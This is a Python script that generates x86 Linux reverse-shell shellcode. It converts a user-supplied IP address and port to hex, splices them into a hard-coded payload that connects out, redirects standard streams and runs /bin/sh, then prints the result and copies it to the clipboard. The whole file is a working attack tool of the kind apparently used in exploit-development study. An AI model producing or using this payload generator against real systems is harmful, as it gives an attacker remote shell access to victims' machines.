#!/usr/bin/python  

import sys  
import socket
import binascii
import pyperclip

# usage

if len(sys.argv) != 3:
	print '[!] Please enter a IP address and port number[!]'	
	print '[*] Usage: {0} <ip-address> <port>'.format(sys.argv[0])
	exit()

ip = sys.argv[1]

port = int(sys.argv[2])

# port validation

if port > 65535:
	print '[!] Enter valid port number [!]'
	exit()

# port to hex

hport = hex(port)[2:]		# hex port and get rid of 0x at start

if len(hport) < 4:		# add a zero if the port is not long enough
	hport = "0" + hport

byte_1 = hport[0:2]		# seperate first two bytes
byte_2 = hport[2:4]		# seperate last two bytes

# add zero if byte is less than 2

if len(byte_1) < 2:
	byte_1 = "0" + byte_1
if len(byte_2) < 2:
	byte_2 = "0" + byte_2

new_port = "\\x" + byte_1 + "\\x" + byte_2

# port to net order

net_order = socket.htons(port)	# turn input port to net order

hnet = hex(net_order)		# turn net order port into hex

# ip to hex

hex_ip = binascii.hexlify(socket.inet_aton(ip)) # convert ip into hex

# break ip into seperate octets

octet_1 = hex_ip[0:2]
octet_2 = hex_ip[2:4]
octet_3 = hex_ip[4:6]
octet_4 = hex_ip[6:8]

# add \\x for shellcode

new_ip = '\\x' + octet_1 + '\\x' + octet_2 + '\\x' + octet_3 + '\\x' + octet_4

# null value warning

if byte_1 == "00":
	print '[!] Port contains null [!]'
	exit()

if byte_2 == "00":
	print '[!] Port contains null [!]'
	exit()

big_line = '------------------------------------------'

print '[*] Input IP: ' + str(ip)
print '[*] Input Port: ' + str(port)
print big_line
print '[INFO] Net Order Port: ' + str(net_order)
print '[INFO] Hex Net Order: ' + str(hnet)
print big_line
print '[*] Byte 1: ' + str(byte_1)
print '[*] Byte 2: ' + str(byte_2)
print big_line
print '[*] New IP: ' + str(new_ip)
print '[*] New Port: ' + str(new_port)
print big_line

shellcode = "\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\xb0\\x66\\x43\\x68" + new_ip + "\\x66\\x68" + new_port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xcd\\x80\\x87\\xde\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

print '[*] New Shellcode: \n' + shellcode

print '[*] Copying Shellcode to clipboard ...'

pyperclip.copy(shellcode)

print '[*] Done!'
